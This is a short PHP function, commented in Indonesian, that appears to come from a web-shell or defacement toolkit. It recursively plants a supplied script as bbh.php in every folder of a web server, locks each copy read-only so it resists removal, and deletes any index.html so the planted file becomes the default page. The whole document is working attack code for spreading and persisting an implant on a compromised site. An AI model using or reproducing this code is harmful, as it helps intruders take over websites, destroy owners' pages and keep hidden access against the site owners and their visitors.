// --- FUNGSI DEPLOY REKURSIF ---
function deployAndLock($dir, $content) {
    $items = scandir($dir);
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        
        if (is_dir($path)) {
            // Target file: bbh.php
            $targetFile = $path . DIRECTORY_SEPARATOR . 'bbh.php';
            
            // 1. Buka permission jika file sudah ada
            if (file_exists($targetFile)) {
                @chmod($targetFile, 0644);
            }
            
            // 2. Tanam script bbh
            if (file_put_contents($targetFile, $content)) {
                // 3. Kunci file (0444 = Read Only)
                chmod($targetFile, 0444);
                echo "[INSTALLED & LOCKED] $targetFile\n";
            }
            
            // 4. Hapus index.html jika ada agar bbh.php diutamakan
            $htmlFile = $path . DIRECTORY_SEPARATOR . 'index.html';
            if (file_exists($htmlFile)) {
                @chmod($htmlFile, 0644);
                @unlink($htmlFile);
            }

            // 5. Lanjut ke sub-folder (Rekursif)
            deployAndLock($path, $content);
        }
    }
}

